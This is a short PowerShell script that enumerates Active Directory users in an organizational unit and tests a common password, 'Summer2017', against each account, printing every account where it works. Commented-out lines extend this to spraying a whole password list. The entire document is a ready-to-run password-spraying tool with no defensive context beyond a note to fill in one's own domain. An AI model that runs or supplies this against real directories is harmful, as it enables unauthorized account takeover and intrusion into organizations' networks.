# Update with your own OU, domain and password.

Get-ADUser -SearchBase “OU=myou,dc=test,dc=local” | Select distinguishedName | ConvertTo-Csv -NoTypeInformation | select -Skip 1 | Set-Content users.txt

# Uncomment below lines (and comment out the 'Summer 2017' line for debugging or to try multiple passwords against each user
foreach ($FQDN in Get-Content .\users.txt)
{
    $results = dsget user $FQDN -samid
    #Write-Host $results
    $samid = $results[1].replace(" ", "")
    #Write-Host $samid
    #foreach ($password in Get-Content .\password.txt)
    #{
        #$password = $password.replace(" ", "")
        #dsget user $FQDN -u $samid -p $password > $null
        dsget user $FQDN -u $samid -p 'Summer2017' > $null
        if ($?) {
            #Write-Host "Account: $samid; Password: $password"
            Write-Host "Account: $samid; Password: Summer2017"

        }
    #}
}
